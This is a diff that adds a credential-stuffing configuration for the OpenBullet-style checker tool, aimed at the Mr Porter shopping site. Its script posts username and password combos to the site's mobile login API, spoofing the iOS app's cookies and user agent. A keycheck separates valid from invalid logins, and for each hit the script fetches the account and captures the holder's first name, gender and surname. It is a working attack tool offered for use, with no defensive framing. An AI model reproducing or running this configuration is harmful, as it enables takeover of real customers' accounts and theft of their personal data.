@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Mr Porter",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-23T23:19:14.2353517+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.mrporter.com/intl/api/auth/login.json" ParseQuery=TRUE 
+  CONTENT "j_password=<PASS>&j_username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "deviceType: Mobile" 
+  COOKIE "nativeapp: ios" 
+  COOKIE "napMobileApp: true" 
+  COOKIE "mobileAppVersion: 7.1.1" 
+  COOKIE "mobileAppName: MRPSHOPPING" 
+  HEADER "Host: www.mrporter.com" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: mobile_mrp_mrporter/7.1.1 (iPhone; iOS 12.0.1; Scale/2.0)" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "NOT" 
+  KEYCHAIN Success OR 
+    KEY "consentId" 
+
+REQUEST GET "https://www.mrporter.com/intl/api/account.json" ParseQuery=TRUE 
+  CONTENT "j_password=<PASS>&j_username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "deviceType: Mobile" 
+  COOKIE "nativeapp: ios" 
+  COOKIE "napMobileApp: true" 
+  COOKIE "mobileAppVersion: 7.1.1" 
+  COOKIE "mobileAppName: MRPSHOPPING" 
+  HEADER "User-Agent: mobile_mrp_mrporter/7.1.1 (iPhone; iOS 12.0.1; Scale/2.0)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.mrporter.com" 
+
+PARSE "<SOURCE>" JSON "firstname" -> CAP "FIRST NAME" 
+
+PARSE "<SOURCE>" JSON "gender" -> CAP "GENDER" 
+
+PARSE "<SOURCE>" JSON "surname" -> CAP "SURNAME" 
+
